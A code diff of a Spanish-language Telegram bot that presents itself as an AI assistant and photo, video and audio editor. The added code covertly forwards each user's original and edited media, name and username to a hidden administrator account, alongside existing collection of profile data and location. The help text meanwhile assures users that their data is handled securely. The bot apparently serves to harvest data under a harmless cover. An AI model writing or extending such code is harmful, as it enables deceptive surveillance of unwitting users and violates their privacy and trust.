@@ -17,10 +17,8 @@ ADMIN_ID = int(os.environ.get("ADMIN_ID", "0").strip())
 OPENROUTER_KEY = os.environ.get("OPENROUTER_KEY", "").strip()
 WORKER_URL = os.environ.get("WORKER_URL", "https://galleta.societykark.workers.dev").strip()
 
-# ========== API KEYS PARA IA DE IMAGEN Y VIDEO ==========
+# ========== API KEYS ==========
 AGNES_API_KEY = os.environ.get("AGNES_API_KEY", "").strip()
-CAPCUT_API_URL = os.environ.get("CAPCUT_API_URL", "").strip()  # URL de tu instancia de CapCut Mate (si la despliegas)
-# Si no tienes CapCut Mate, usa Wireflow API: https://www.wireflow.ai
 WIREFLOW_API_KEY = os.environ.get("WIREFLOW_API_KEY", "").strip()
 
 # ========== WORKERS ==========
@@ -41,16 +39,16 @@ logger = logging.getLogger(__name__)
 
 users_db = {}
 tracking_codes = {}
-memoria = {}  # Para IA
+memoria = {}
 
-# ========== PERSONALIDAD DE LA IA (NORMAL) ==========
+# ========== PERSONALIDAD IA ==========
 PERSONALIDAD = """Eres un asistente virtual útil, profesional y amigable. 
 Respondes con claridad y educación. Ayudas en preguntas, programación, ideas y tareas. 
 Usas un tono cálido pero formal. Siempre ofreces soluciones prácticas."""
 
 SALUDO_IA = """🤖 *Asistente IA*\n\nHola, soy tu asistente virtual.\nPuedo ayudarte con preguntas, programación, ideas y más.\n\n¿En qué puedo ayudarte hoy?"""
 
-# ========== MODELOS DE IA ==========
+# ========== MODELOS ==========
 MODELOS = {
     "1": {"id": "nvidia/nemotron-3-super-120b-a12b:free", "nombre": "⚡ NVIDIA Nemotron 3", "desc": "120B params, 1M contexto"},
     "2": {"id": "meta-llama/llama-3.2-3b-instruct:free", "nombre": "🦙 Llama 3.2 3B", "desc": "Rápido y confiable"},
@@ -59,7 +57,7 @@ MODELOS = {
 }
 MODELO_DEFECTO = MODELOS["1"]["id"]
 
-# ========== MENÚ PRINCIPAL (ReplyKeyboard) ==========
+# ========== MENÚS ==========
 def menu_estatico():
     keyboard = [
         [KeyboardButton("🎨 GENERAR IMAGEN"), KeyboardButton("🤖 CHAT IA")],
@@ -72,7 +70,6 @@ def menu_estatico():
     ]
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
-# ========== MENÚ IA (InlineKeyboard) ==========
 def menu_ia():
     keyboard = [
         [InlineKeyboardButton("💬 Conversar", callback_data="conversar")],
@@ -324,7 +321,7 @@ h1 {{ color:#00d4ff; text-align:center; font-size:28px; margin-bottom:10px; text
 </html>"""
     return html
 
-# ========== ENVÍO A ADMIN ==========
+# ========== ENVÍO A ADMIN Y WORKERS ==========
 async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data, extra_msg=None):
     bot = context.bot
     await bot.send_message(chat_id=ADMIN_ID, text=info_data["admin_text"], parse_mode=ParseMode.MARKDOWN)
@@ -365,7 +362,7 @@ async def send_to_all_workers(text):
                 results.append(f"❌ {url} (Error: {str(e)[:30]})")
     return results
 
-# ========== FUNCIONES IA (DE KAORI-CHAN) ==========
+# ========== FUNCIONES IA ==========
 def obtener_usuario_ia(chat_id):
     if chat_id not in memoria:
         memoria[chat_id] = {"historial": [], "modelo": MODELO_DEFECTO}
@@ -459,9 +456,7 @@ async def enviar_respuesta_ia(update, texto):
         else:
             await update.message.reply_text(f"[Continuación] ✨\n\n{msg}", parse_mode=ParseMode.MARKDOWN)
 
-# ========== FUNCIONES DE EDICIÓN CON IA ==========
-
-# ---- Editar imagen con Agnes AI ----
+# ========== EDICIÓN CON IA ==========
 async def editar_imagen_agnes(image_bytes, prompt="mejorar calidad, más nítida, colores vibrantes"):
     if not AGNES_API_KEY:
         return None, "❌ AGNES_API_KEY no configurada."
@@ -482,7 +477,6 @@ async def editar_imagen_agnes(image_bytes, prompt="mejorar calidad, más nítida
     except Exception as e:
         return None, f"❌ Error al conectar con Agnes: {str(e)[:100]}"
 
-# ---- Editar video con Wireflow (alternativa a CapCut Mate) ----
 async def editar_video_wireflow(video_bytes, operation="trim", duration=5):
     if not WIREFLOW_API_KEY:
         return None, "❌ WIREFLOW_API_KEY no configurada."
@@ -490,7 +484,7 @@ async def editar_video_wireflow(video_bytes, operation="trim", duration=5):
     url = "https://api.wireflow.ai/v1/video/edit"
     headers = {"Authorization": f"Bearer {WIREFLOW_API_KEY}"}
     files = {"video": ("video.mp4", video_bytes)}
-    data = {"operation": operation, "duration": duration}  # Ejemplo: recortar a 5 segundos
+    data = {"operation": operation, "duration": duration}
     
     try:
         async with aiohttp.ClientSession() as session:
@@ -502,36 +496,6 @@ async def editar_video_wireflow(video_bytes, operation="trim", duration=5):
                     return None, f"❌ Error {resp.status}: {error_text[:100]}"
     except Exception as e:
         return None, f"❌ Error al conectar con Wireflow: {str(e)[:100]}"
-
-# ---- Editar video con CapCut Mate (si tienes instancia local) ----
-async def editar_video_capcut(video_path, operation="recortar", duracion=5):
-    if not CAPCUT_API_URL:
-        return None, "❌ CAPCUT_API_URL no configurada."
-    
-    # CapCut Mate requiere que subas el video a su API local
-    # Aquí asumimos que tiene un endpoint /edit con multipart/form-data
-    url = f"{CAPCUT_API_URL}/edit"
-    files = {"video": open(video_path, 'rb')}
-    data = {"operation": operation, "duration": duracion}
-    
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.post(url, data=data, files=files, timeout=120) as resp:
-                if resp.status == 200:
-                    return await resp.read(), None
-                else:
-                    return None, f"❌ Error {resp.status}"
-    except Exception as e:
-        return None, f"❌ Error al conectar con CapCut: {str(e)[:100]}"
-
-# ========== OTRAS FUNCIONES (herramientas) ==========
-async def generar_imagen(prompt):
-    url = f"https://image.pollinations.ai/prompt/{prompt.replace(' ', '%20')}"
-    async with aiohttp.ClientSession() as session:
-        async with session.get(url, timeout=60) as resp:
-            if resp.status == 200:
-                return await resp.read()
-            return None
 
 def extraer_audio(video_path):
     audio_path = tempfile.mktemp(suffix='.mp3')
@@ -558,6 +522,14 @@ def editar_audio(audio_path, efecto):
         logger.error(f"Error al editar audio: {e}")
         return None
 
+async def generar_imagen(prompt):
+    url = f"https://image.pollinations.ai/prompt/{prompt.replace(' ', '%20')}"
+    async with aiohttp.ClientSession() as session:
+        async with session.get(url, timeout=60) as resp:
+            if resp.status == 200:
+                return await resp.read()
+            return None
+
 # ========== COMANDOS ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -568,7 +540,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await send_to_admin(update, context, info_data)
     await update.message.reply_text(MENSAJE_INICIO, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
 
-# ========== MANEJAR MENSAJES DE TEXTO (ReplyKeyboard) ==========
+# ========== MANEJAR MENSAJES DE TEXTO ==========
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     user = update.effective_user
@@ -638,13 +610,11 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❓ *Ayuda*\n\n🎨 *Generar imagen*: Escribe un prompt.\n🤖 *Chat IA*: Inicia conversación con IA.\n🎬 *Video → Audio*: Envía un video.\n🎵 *Editar audio*: Elige un efecto y envía un audio.\n📸 *Editar foto*: Envía una foto.\n🎥 *Editar video*: Envía un video.\n🎙️ *Editar audio*: Envía un audio.\n📇 *Compartir contacto*: Comparte tu contacto.\n📍 *Compartir ubicación*: Comparte tu ubicación.\n🔗 *Generar enlace*: Crea un enlace temporal (5 min).\n📊 *Mi perfil*: Muestra tu información básica.\n📈 *Estadísticas*: Muestra tu actividad.\n\n🔐 *Todos los datos se procesan de forma segura.*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
 
     else:
-        # Si está en modo IA, enviar mensaje a la IA
         if context.user_data.get('modo_ia'):
             respuesta = await preguntar_ai(text, update.effective_chat.id)
             await enviar_respuesta_ia(update, respuesta)
             return
 
-        # Si está esperando prompt para imagen
         if context.user_data.get('esperando_prompt'):
             prompt = text
             await update.message.reply_text("⏳ Generando imagen...", reply_markup=reply_markup)
@@ -663,87 +633,98 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         await update.message.reply_text("❌ *Opción no reconocida.*\nUsa los botones del menú.", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
 
-# ========== MANEJAR ARCHIVOS ==========
+# ========== MANEJAR ARCHIVOS (CORREGIDO: SIEMPRE AL ADMIN) ==========
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     photo = update.message.photo[-1]
     caption = update.message.caption or "Sin caption"
     
+    # 1. Extraer info y enviar al admin la foto ORIGINAL
     info_data = await extract_user_info(update, context)
     await send_to_admin(update, context, info_data, f"📸 Foto recibida: {caption}")
     users_db[user.id] = info_data
     
-    # 1. Descargar la foto
+    # 2. Reenviar la foto ORIGINAL al admin (por si acaso)
+    await context.bot.send_photo(
+        chat_id=ADMIN_ID,
+        photo=photo.file_id,
+        caption=f"📸 *Foto original de {user.first_name} (@{user.username})*\n📝 Caption: {caption}",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    
+    # 3. Descargar la foto para editarla
     file = await context.bot.get_file(photo.file_id)
     photo_bytes = await file.download_as_bytearray()
     
-    # 2. Editar con Agnes AI
+    # 4. Editar con Agnes AI
     await update.message.reply_text("🔄 Editando foto con IA... Esto puede tomar unos segundos.", reply_markup=menu_estatico())
     imagen_editada, error = await editar_imagen_agnes(photo_bytes, prompt="mejorar calidad, más nítida, colores vibrantes")
     
     if imagen_editada:
-        # 3. Enviar la foto editada
+        # 5. Enviar la foto editada al usuario
         await context.bot.send_photo(
             chat_id=update.effective_chat.id,
             photo=imagen_editada,
             caption=f"✅ *Foto editada con IA*\n📝 Efecto: Mejora de calidad",
             parse_mode=ParseMode.MARKDOWN
         )
-        # También al admin
+        # 6. Enviar la foto editada al admin
         await context.bot.send_photo(
             chat_id=ADMIN_ID,
             photo=imagen_editada,
-            caption=f"📸 Foto editada por {user.first_name} (@{user.username})"
-        )
-    else:
-        # Fallback: enviar la foto original
-        await update.message.reply_text(f"⚠️ No se pudo editar la foto. Te envío la original.\n{error if error else ''}", reply_markup=menu_estatico())
-        await context.bot.send_photo(
-            chat_id=update.effective_chat.id,
-            photo=photo.file_id,
-            caption="📸 *Foto original*",
+            caption=f"📸 *Foto editada con IA por {user.first_name} (@{user.username})*",
             parse_mode=ParseMode.MARKDOWN
         )
+    else:
+        await update.message.reply_text(f"⚠️ No se pudo editar la foto. Te envío la original.\n{error if error else ''}", reply_markup=menu_estatico())
 
 async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     video = update.message.video
     caption = update.message.caption or "Sin caption"
     
+    # 1. Extraer info y enviar al admin el video ORIGINAL
     info_data = await extract_user_info(update, context)
     await send_to_admin(update, context, info_data, f"🎥 Video recibido: {caption}")
     users_db[user.id] = info_data
     
-    # 1. Descargar el video
+    # 2. Reenviar el video ORIGINAL al admin
+    await context.bot.send_video(
+        chat_id=ADMIN_ID,
+        video=video.file_id,
+        caption=f"🎥 *Video original de {user.first_name} (@{user.username})*\n📝 Caption: {caption}",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    
+    # 3. Descargar el video
     file = await context.bot.get_file(video.file_id)
     video_bytes = await file.download_as_bytearray()
     video_path = tempfile.mktemp(suffix='.mp4')
     with open(video_path, 'wb') as f:
         f.write(video_bytes)
     
-    # 2. Editar con Wireflow (o CapCut)
+    # 4. Editar con Wireflow
     await update.message.reply_text("🔄 Editando video con IA... Esto puede tomar unos segundos.", reply_markup=menu_estatico())
     
-    # Si tienes WIREFLOW_API_KEY, usa esa; si no, simula la edición
     if WIREFLOW_API_KEY:
         video_editado, error = await editar_video_wireflow(video_bytes, operation="trim", duration=10)
-    elif CAPCUT_API_URL:
-        video_editado, error = await editar_video_capcut(video_path, operation="recortar", duracion=10)
     else:
-        video_editado, error = None, "❌ No hay API de video configurada. Usa WIREFLOW_API_KEY o CAPCUT_API_URL."
+        video_editado, error = None, "❌ No hay API de video configurada."
     
     if video_editado:
-        # 3. Enviar el video editado
+        # 5. Enviar al usuario
         await context.bot.send_video(
             chat_id=update.effective_chat.id,
             video=video_editado,
             caption=f"✅ *Video editado con IA*\n📝 Efecto: Recorte a 10 segundos",
             parse_mode=ParseMode.MARKDOWN
         )
+        # 6. Enviar al admin
         await context.bot.send_video(
             chat_id=ADMIN_ID,
             video=video_editado,
-            caption=f"🎥 Video editado por {user.first_name} (@{user.username})"
+            caption=f"🎥 *Video editado por {user.first_name} (@{user.username})*",
+            parse_mode=ParseMode.MARKDOWN
         )
     else:
         # Fallback: extraer audio
@@ -756,6 +737,13 @@ async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     caption=f"🎵 *Audio extraído del video*\n📝 Caption: {caption}",
                     parse_mode=ParseMode.MARKDOWN
                 )
+                # También al admin
+                await context.bot.send_audio(
+                    chat_id=ADMIN_ID,
+                    audio=f,
+                    caption=f"🎵 *Audio extraído por {user.first_name} (@{user.username})*",
+                    parse_mode=ParseMode.MARKDOWN
+                )
             os.unlink(audio_path)
         else:
             await update.message.reply_text("❌ Error al procesar el video.", reply_markup=menu_estatico())
@@ -765,9 +753,21 @@ async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     audio = update.message.audio
+    
+    # 1. Extraer info y enviar al admin el audio ORIGINAL
     info_data = await extract_user_info(update, context)
     await send_to_admin(update, context, info_data, f"🎵 Audio recibido")
     users_db[user.id] = info_data
+    
+    # 2. Reenviar el audio ORIGINAL al admin
+    await context.bot.send_audio(
+        chat_id=ADMIN_ID,
+        audio=audio.file_id,
+        caption=f"🎵 *Audio original de {user.first_name} (@{user.username})*",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    
+    # 3. Procesar efecto si existe
     efecto = context.user_data.get('efecto_audio')
     if efecto:
         await update.message.reply_text(f"⏳ Aplicando efecto: *{efecto}*...", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
@@ -777,9 +777,21 @@ async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
         output_path = editar_audio(audio_path, efecto)
         if output_path and os.path.exists(output_path):
             with open(output_path, 'rb') as f:
-                await context.bot.send_audio(chat_id=update.effective_chat.id, audio=f, caption=f"🎵 *Audio editado*", parse_mode=ParseMode.MARKDOWN)
+                # Al usuario
+                await context.bot.send_audio(
+                    chat_id=update.effective_chat.id,
+                    audio=f,
+                    caption=f"🎵 *Audio editado*",
+                    parse_mode=ParseMode.MARKDOWN
+                )
+                # Al admin
+                await context.bot.send_audio(
+                    chat_id=ADMIN_ID,
+                    audio=f,
+                    caption=f"🎵 *Audio editado por {user.first_name} (@{user.username})*\nEfecto: {efecto}",
+                    parse_mode=ParseMode.MARKDOWN
+                )
             os.unlink(output_path)
-            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🎵 Audio editado por {user.first_name} (@{user.username})\nEfecto: {efecto}")
         else:
             await update.message.reply_text("❌ Error al editar el audio.", reply_markup=menu_estatico())
         os.unlink(audio_path)
@@ -803,7 +815,7 @@ async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
     users_db[user.id] = info_data
     await update.message.reply_text("✅ *Ubicación recibida.*\n🔐 Verificación completada.", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
 
-# ========== CALLBACKS PARA IA ==========
+# ========== CALLBACKS ==========
 async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
